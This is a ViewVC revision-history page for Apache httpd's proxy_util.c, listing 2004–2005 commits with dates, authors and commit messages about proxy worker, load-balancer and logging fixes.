Diff to [previous 328463](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=328463&r2=329849)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=328463&r2=329849&diff_format=h))
```
Fix a problem where we are doing a case insensitive
match between the worker and the URL. Instead, only
the scheme and hostname are insensitive, the rest
should be case sensitive.

```

---

Revision [**328463**](/viewvc?view=revision&revision=328463) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=328463&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=328463&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=328463))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=328463)

Modified
*Tue Oct 25 19:54:11 2005 UTC*
(19 years, 3 months ago)
by *rpluem*

File length: 67369 byte(s)

Diff to [previous 314881](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=314881&r2=328463)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=314881&r2=328463&diff_format=h))
```
* Fix PR36906 by not lower caseing the whole worker name. Only lower case the
  schema when storing the worker url. Thus preventing case sensitive URI's in
  BalancerMembers to get broken.

```

---

Revision [**314881**](/viewvc?view=revision&revision=314881) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=314881&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=314881&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=314881))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=314881)

Modified
*Wed Oct 12 13:05:59 2005 UTC*
(19 years, 3 months ago)
by *jim*

File length: 67337 byte(s)

Diff to [previous 314875](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=314875&r2=314881)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=314875&r2=314881&diff_format=h))
```
Performance Tune: Do the cheap and fast length check before
we bother doing a char-by-char comparison.

```

---

Revision [**314875**](/viewvc?view=revision&revision=314875) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=314875&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=314875&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=314875))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=314875)

Modified
*Wed Oct 12 13:01:25 2005 UTC*
(19 years, 3 months ago)
by *jim*

File length: 67337 byte(s)

Diff to [previous 312963](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=312963&r2=314875)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=312963&r2=314875&diff_format=h))
```
Fix -Wall warning... Thanks to Joe for the head's up!

```

---

Revision [**312963**](/viewvc?view=revision&revision=312963) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=312963&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=312963&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=312963))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=312963)

Modified
*Tue Oct 11 21:40:32 2005 UTC*
(19 years, 3 months ago)
by *jim*

File length: 67326 byte(s)

Diff to [previous 293301](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=293301&r2=312963)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=293301&r2=312963&diff_format=h))
```
mod_proxy_balancer: BalancerManager and proxies correctly handle
member workers with paths. PR36816. [Ruediger Pluem, Jim Jagielski]

```

---

Revision [**293301**](/viewvc?view=revision&revision=293301) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=293301&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=293301&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=293301))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=293301)

Modified
*Mon Oct 3 10:54:34 2005 UTC*
(19 years, 3 months ago)
by *rpluem*

File length: 66982 byte(s)

Diff to [previous 292434](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=292434&r2=293301)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=292434&r2=293301&diff_format=h))
```
* Fix style nits (whitespaces / formats of comments). No Functional changes.

```

---

Revision [**292434**](/viewvc?view=revision&revision=292434) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=292434&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=292434&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=292434))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=292434)

Modified
*Thu Sep 29 13:59:27 2005 UTC*
(19 years, 4 months ago)
by *jim*

File length: 66906 byte(s)

Diff to [previous 279752](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=279752&r2=292434)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=279752&r2=292434&diff_format=h))
```
de-ref bug - balancer is always not null since it's &balancer
from the caller.

```

---

Revision [**279752**](/viewvc?view=revision&revision=279752) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=279752&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=279752&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=279752))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=279752)

Modified
*Fri Sep 9 12:28:02 2005 UTC*
(19 years, 4 months ago)
by *jim*

File length: 66905 byte(s)

Diff to [previous 279305](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=279305&r2=279752)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=279305&r2=279752&diff_format=h))
```
Proxy balancer lbmethods are now registered as providers and not
via hooks. Move various find() functions back to mod_proxy_balancer
where they belong :)

```

---

Revision [**279305**](/viewvc?view=revision&revision=279305) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=279305&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=279305&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=279305))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=279305)

Modified
*Wed Sep 7 12:04:15 2005 UTC*
(19 years, 4 months ago)
by *jim*

File length: 72589 byte(s)

Diff to [previous 232311](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=232311&r2=279305)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=232311&r2=279305&diff_format=h))
```
Restruct of lbmethod find-best algo's, bypassing hook mechanism.
Looking into provider method, but until then... Prevent core dump
when balancer not in vhosts

```

---

Revision [**232311**](/viewvc?view=revision&revision=232311) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=232311&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=232311&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=232311))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=232311)

Modified
*Fri Aug 12 15:22:19 2005 UTC*
(19 years, 5 months ago)
by *martin*

File length: 66993 byte(s)

Diff to [previous 232282](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=232282&r2=232311)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=232282&r2=232311&diff_format=h))
```
Get rid of some warnings

```

---

Revision [**232282**](/viewvc?view=revision&revision=232282) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=232282&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=232282&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=232282))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=232282)

Modified
*Fri Aug 12 12:47:04 2005 UTC*
(19 years, 5 months ago)
by *jim*

File length: 66923 byte(s)

Diff to [previous 232247](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=232247&r2=232282)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=232247&r2=232282&diff_format=h))
```
simple, functional interface to add additional balancer lb selection methods
without requiring code changes to mod_proxy/mod_proxy_balancer;
these can be implemented via sub-modules now.

Let the games begin...

```

---

Revision [**232247**](/viewvc?view=revision&revision=232247) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=232247&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=232247&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=232247))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=232247)

Modified
*Fri Aug 12 09:38:09 2005 UTC*
(19 years, 5 months ago)
by *niq*

File length: 66564 byte(s)

Diff to [previous 225751](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=225751&r2=232247)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=225751&r2=232247&diff_format=h))
```
Fix mess left by incompleteness of previous ProxyPassReverse fix

```

---

Revision [**225751**](/viewvc?view=revision&revision=225751) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=225751&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=225751&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=225751))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=225751)

Modified
*Thu Jul 28 11:16:34 2005 UTC*
(19 years, 6 months ago)
by *mturk*

File length: 66570 byte(s)

Diff to [previous 178391](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=178391&r2=225751)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=178391&r2=225751&diff_format=h))
```
Add status param option so that current worker
status can be changed via editing httpd.conf instead
just using web page. Seems the ApacheCon is paying of.
Thanks to Sander for pointing that out.

```

---

Revision [**178391**](/viewvc?view=revision&revision=178391) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=178391&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=178391&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=178391))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=178391)

Modified
*Wed May 25 06:42:33 2005 UTC*
(19 years, 8 months ago)
by *pquerna*

File length: 66551 byte(s)

Diff to [previous 160674](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=160674&r2=178391)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=160674&r2=178391&diff_format=h))
```
- Use apr_uri_t to parse the proxy URL, instead of munging it by hand. Original code did not handle IPv6 Addresses correctly.

```

---

Revision [**160674**](/viewvc?view=revision&revision=160674) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=160674&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=160674&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=160674))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=160674)

Modified
*Sat Apr 9 10:08:56 2005 UTC*
(19 years, 9 months ago)
by *mturk*

File length: 66970 byte(s)

Diff to [previous 160663](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=160663&r2=160674)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=160663&r2=160674&diff_format=h))
```
Revert the latest hack for setting query string.
The balancer needs canon_handler.

```

---

Revision [**160663**](/viewvc?view=revision&revision=160663) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=160663&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=160663&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=160663))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=160663)

Modified
*Sat Apr 9 07:32:42 2005 UTC*
(19 years, 9 months ago)
by *mturk*

File length: 67028 byte(s)

Diff to [previous 153105](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=153105&r2=160663)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=153105&r2=160663&diff_format=h))
```
Add r->args to uri->query if the original r->uri
did not contain query string. This fixes #34266.

```

---

Revision [**153105**](/viewvc?view=revision&revision=153105) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=153105&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=153105&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=153105))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=153105)

Modified
*Wed Feb 9 19:01:43 2005 UTC*
(19 years, 11 months ago)
by *trawick*

File length: 66970 byte(s)

Diff to [previous 152964](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=152964&r2=153105)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=152964&r2=153105&diff_format=h))
```
Remove formatting characters from ap_log_error() calls.  These
were escaped as fallout from CAN-2003-0020.

Submitted by: Eric Covener <ecovener gmail.com>
Reviewed by: Jeff Trawick

```

---

Revision [**152964**](/viewvc?view=revision&revision=152964) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=152964&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=152964&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=152964))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=152964)

Modified
*Tue Feb 8 23:57:50 2005 UTC*
(19 years, 11 months ago)
by *striker*

File length: 66976 byte(s)

Diff to [previous 151408](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=151408&r2=152964)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=151408&r2=152964&diff_format=h))
```
* modules/proxy/proxy_util.c

  (ap_proxy_pre_request): Log an error when all workers are busy.

```

---

Revision [**151408**](/viewvc?view=revision&revision=151408) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=151408&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=151408&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=151408))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=151408)

Modified
*Fri Feb 4 20:28:49 2005 UTC*
(19 years, 11 months ago)
by *jerenkrantz*

File length: 66846 byte(s)

Diff to [previous 151153](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=151153&r2=151408)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=151153&r2=151408&diff_format=h))
```
Update copyright year to 2005 and standardize on current copyright owner line.

```

---

Revision [**151153**](/viewvc?view=revision&revision=151153) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=151153&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=151153&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=151153))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=151153)

Modified
*Thu Feb 3 13:38:24 2005 UTC*
(19 years, 11 months ago)
by *jim*

File length: 66810 byte(s)

Diff to [previous 126304](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=126304&r2=151153)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=126304&r2=151153&diff_format=h))
```
Close PR 32459, 15207. API change for PROXY_DECLARE ap_proxy_canonenc()

```

---

Revision [**126304**](/viewvc?view=revision&revision=126304) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=126304&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=126304&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=126304))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=126304)

Modified
*Mon Jan 24 18:28:16 2005 UTC*
(20 years ago)
by *jim*

File length: 66664 byte(s)

Diff to [previous 124901](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=124901&r2=126304)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=124901&r2=126304&diff_format=h))
```
Add in a weighted byte count of all traffic (in and out) as
an alternative balancing method. We do not "adjust" the
byte count wrt scheme or method, simply by factoring
in the lbfactor value.

```

---

Revision [**124901**](/viewvc?view=revision&revision=124901) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=124901&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=124901&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=124901))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=124901)

Modified
*Tue Jan 11 08:35:46 2005 UTC*
(20 years ago)
by *striker*

File length: 66617 byte(s)

Diff to [previous 123884](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=123884&r2=124901)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=123884&r2=124901&diff_format=h))
```
Rewrite Cookies and other headers in mod_proxy_ajp as configured with
ProxyPassReverse and ProxyPassReverseCookiePath.

* modules/proxy/proxy_ajp.c

  (ap_proxy_ajp_request): Update call to ajp_parse_header().

* modules/proxy/ajp.h

  (ajp_msg_get_string): constify argument.

  (ajp_parse_header): Add conf argument.

* modules/proxy/proxy_util.c

  (ap_proxy_location_reverse_map): Promoted from mod_proxy_http.

  (ap_proxy_cookie_reverse_map): Promoted from mod_proxy_http;
    renamed from proxy_cookie_reverse_map.

* modules/proxy/ajp_msg.c

  (ajp_msg_get_string): constify argument.

* modules/proxy/proxy_http.c

  (ap_proxy_location_reverse_map, proxy_cookie_reverse_map: Removed.

  (process_proxy_header): Update header mapping table to reference the now
    public functions.

* modules/proxy/ajp_header.c

  (ajp_unmarshal_response): And conf argument.  Reverse map cookies and
    other headers.

  (ajp_parse_header): Update call to ajp_unmarshal_response().

* modules/proxy/mod_proxy.h

  (ap_proxy_location_reverse_map, ap_proxy_cookie_reverse_map): Declare
    functions that have been promoted to be public.

  (ap_proxy_header_reverse_map_fn): Typedef for the signature of the above
    two functions (currently used in mod_proxy_http).

```

---

Revision [**123884**](/viewvc?view=revision&revision=123884) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=123884&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=123884&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=123884))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=123884)

Modified
*Sun Jan 2 08:00:26 2005 UTC*
(20 years ago)
by *mturk*

File length: 62335 byte(s)

Diff to [previous 123842](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=123842&r2=123884)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=123842&r2=123884&diff_format=h))
```
Kill the pool cleanup when closing non cachable connection.

```

---

Revision [**123842**](/viewvc?view=revision&revision=123842) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=123842&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=123842&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=123842))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=123842)

Modified
*Sat Jan 1 16:04:25 2005 UTC*
(20 years ago)
by *mturk*

File length: 62088 byte(s)

Diff to [previous 123840](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=123840&r2=123842)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=123840&r2=123842&diff_format=h))
```
Fix closing connection for non-cachable proxies.
Do not close the entire connection, just socket if
opened.

```

---

Revision [**123840**](/viewvc?view=revision&revision=123840) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=123840&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=123840&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=123840))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=123840)

Modified
*Sat Jan 1 15:23:51 2005 UTC*
(20 years ago)
by *mturk*

File length: 62113 byte(s)

Diff to [previous 123811](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=123811&r2=123840)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=123811&r2=123840&diff_format=h))
```
Close the connection for generic forward and
reverse proxy workers.

```

---

Revision [**123811**](/viewvc?view=revision&revision=123811) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=123811&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=123811&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=123811))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=123811)

Modified
*Fri Dec 31 17:25:58 2004 UTC*
(20 years ago)
by *mturk*

File length: 61835 byte(s)

Diff to [previous 123809](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=123809&r2=123811)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=123809&r2=123811&diff_format=h))
```
Simplify connection address and port resolving for non-cachable workers (gereric forward and reverse proxy).

```

---

Revision [**123809**](/viewvc?view=revision&revision=123809) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=123809&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=123809&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=123809))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=123809)

Modified
*Fri Dec 31 17:01:05 2004 UTC*
(20 years ago)
by *mturk*

File length: 61749 byte(s)

Diff to [previous 111827](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=111827&r2=123809)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=111827&r2=123809&diff_format=h))
```
Do not cache hostname and port for forward and
reverse generic proxy workers.

```

---

Revision [**111827**](/viewvc?view=revision&revision=111827) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=111827&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=111827&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=111827))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=111827)

Modified
*Tue Dec 14 15:45:19 2004 UTC*
(20 years, 1 month ago)
by *mturk*

File length: 61414 byte(s)

Diff to [previous 111304](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=111304&r2=111827)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=111304&r2=111827&diff_format=h))
```
Make proxy address cache thread safe and available only
to pooled workers.

```

---

Revision [**111304**](/viewvc?view=revision&revision=111304) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=111304&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=111304&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=111304))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=111304)

Modified
*Wed Dec 8 20:19:04 2004 UTC*
(20 years, 1 month ago)
by *trawick*

File length: 60786 byte(s)

Diff to [previous 109506](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=109506&r2=111304)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=109506&r2=111304&diff_format=h))
```
mod_proxy: Respect errors reported by pre_connection hooks.

```

---

Revision [**109506**](/viewvc?view=revision&revision=109506) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=109506&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=109506&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=109506))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=109506)

Modified
*Thu Dec 2 16:37:41 2004 UTC*
(20 years, 1 month ago)
by *trawick*

File length: 60509 byte(s)

Diff to [previous 109316](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=109316&r2=109506)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=109316&r2=109506&diff_format=h))
```
wrong format string was converted to APR_PID_T_FMT

```

---

Revision [**109316**](/viewvc?view=revision&revision=109316) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=109316&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=109316&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=109316))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=109316)

Modified
*Wed Dec 1 08:44:11 2004 UTC*
(20 years, 1 month ago)
by *mturk*

File length: 60509 byte(s)

Diff to [previous 106903](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=106903&r2=109316)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=106903&r2=109316&diff_format=h))
```
Add generic reverse proxy worker so that module-driven reverse proxying works. It is enabled by default, but IMO it should be configurable like any other worker so we can limit the number of outgoing connections.

```

---

Revision [**106903**](/viewvc?view=revision&revision=106903) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=106903&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=106903&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=106903))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=106903)

Modified
*Mon Nov 29 10:54:46 2004 UTC*
(20 years, 2 months ago)
by *mturk*

File length: 59746 byte(s)

Diff to [previous 106902](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=106902&r2=106903)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=106902&r2=106903&diff_format=h))
```
Use APR_PID_T_FMT instead %d for pid logging.

```

---

Revision [**106902**](/viewvc?view=revision&revision=106902) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=106902&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=106902&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=106902))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=106902)

Modified
*Mon Nov 29 10:43:28 2004 UTC*
(20 years, 2 months ago)
by *mturk*

File length: 59714 byte(s)

Diff to [previous 106103](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=106103&r2=106902)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=106103&r2=106902&diff_format=h))
```
Make sure that worker initialization is done only
once per worker, as well the initialization of shared
memory slot. Also log the child pid so that logging
makes sense.

```

---

Revision [**106103**](/viewvc?view=revision&revision=106103) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=106103&view=markup))
